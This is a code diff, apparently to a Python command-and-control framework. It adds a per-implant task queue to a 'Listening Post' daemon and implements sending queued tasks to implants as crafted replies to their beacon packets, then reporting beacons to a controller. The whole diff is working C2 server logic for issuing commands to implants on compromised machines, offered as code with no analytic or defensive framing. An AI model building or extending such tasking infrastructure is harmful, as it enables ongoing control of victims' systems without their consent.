@@ -40,6 +40,32 @@ class BeaconFilterList(list):
                 self.on_remove(filter)
 
 
+class ImplantTaskQueue(dict):
+
+    def __init__(self, *args, **kwargs):
+        super(ImplantTaskQueue, self).__init__(*args, **kwargs)
+
+    def __delitem__(self, key):
+        # Remove task from controller
+        super(ImplantTaskQueue, self).__delitem__(key)
+
+    def add_task(self, implant_uuid, task):
+        if implant_uuid not in self.keys():
+            self[implant_uuid] = list()
+        self[implant_uuid].append(task)
+
+    def remove_task(self, implant_uuid, task):
+        if task in self[implant_uuid]:
+            self[implant_uuid].remove(task)
+        if len(self[implant_uuid]) < 1:
+            del self[implant_uuid]
+        api.remove_task(implant_uuid, task['id'])
+
+    def get_next_task(self, implant_uuid):
+        if implant_uuid in self.keys():
+            return self[implant_uuid][0]
+        return None
+
 class LP(Daemon):
     """Listening Post (LP) service for receiving and processing Command &
     Control Beacons from implants.
@@ -64,7 +90,7 @@ class LP(Daemon):
         self.beacon_filters = BeaconFilterList(
             on_add=self._new_beacon_filter_callback,
             on_remove=self._remove_beacon_filter_callback)
-        self.task_queue = {}
+        self.task_queue = ImplantTaskQueue()
 
     def _pkt_handler(self, pkt):
         """Process a packet
@@ -86,24 +112,29 @@ class LP(Daemon):
                     beacon = self.extract_beacon_from_packet(
                         packet[0], data_map_list)
 
-                    if beacon.uuid in self.task_queue.keys():
+                    # Process any queued tasking for this implant
+                    task = self.task_queue.get_next_task(beacon.uuid)
+                    if task:
                         self.send_implant_task(
                             pkt,
                             beacon_data['response_data_type'],
-                            beacon_data['response_data_mapping'],
-                            self.task_queue[beacon.uuid].pop())
-                        if len(self.task_queue[beacon.uuid]) < 1:
-                            del self.task_queue[beacon.uuid]
+                            json.loads(beacon_data['response_data_mapping']),
+                            task)
+                        self.task_queue.remove_task(beacon.uuid, task)
 
                     self.send_beacon_to_controller(beacon)
 
     def send_implant_task(
         self, pkt, response_data_type, response_data_mapping, task):
         """Send tasking to an Implant by responding to a Beacon"""
-        # TODO: Send task to implant by responding to beacon packet
-      
-        response = get_response_by_name(response_data_type)()
-        response.print_response(pkt)
+        self._log("Sending task to implant: %s" % task)
+     
+        response_factory = get_response_by_name(response_data_type)()
+        response = response_factory.create_response(pkt)
+        response_factory.add_response_data(
+            response, task, response_data_mapping)
+        # Send the response packet
+        send(response)
 
     def send_beacon_to_controller(self, beacon):
         api.send_beacon(beacon)
